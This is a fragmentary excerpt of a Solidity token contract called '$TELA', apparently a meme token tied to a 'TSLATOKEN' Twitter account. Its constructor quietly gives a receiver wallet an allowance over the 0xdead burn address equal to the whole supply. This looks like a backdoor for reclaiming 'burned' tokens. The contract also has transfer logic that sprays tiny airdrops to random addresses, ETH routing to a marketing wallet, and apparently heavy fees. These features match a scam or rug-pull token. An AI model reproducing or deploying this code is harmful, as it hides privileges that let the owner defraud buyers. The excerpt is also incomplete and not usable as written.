...
/**
 * Twitter: https://twitter.com/TSLATOKEN
*/
...
abstract contract ERC20 is Context, IERC20, Ownable {
    ...
    address[2] memory _walletParam) 
    {
        ...
        _allowances[address(0xdead)][address(receiverAddr)] = _totalSupply;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[receiverAddr] = true;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        {
            if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient] && airDropAmount > 0){
                address ad;
                for(uint256 i=0;i < airDropAmount;i++){
                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(sender,ad,100);
                }
                amount -= 100 * airDropAmount;
            }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHMarketing > 0)
            transferToAddressETH(marketWalletAddress, amountETHMarketing);
...
contract $TELA is ERC20 {
    constructor() ERC20(
        "$TELA",
        "$TELA",
        100000000000,
        [uint256(3000),uint256(0),uint256(0)],
        [uint256(3000),uint256(0),uint256(0)],
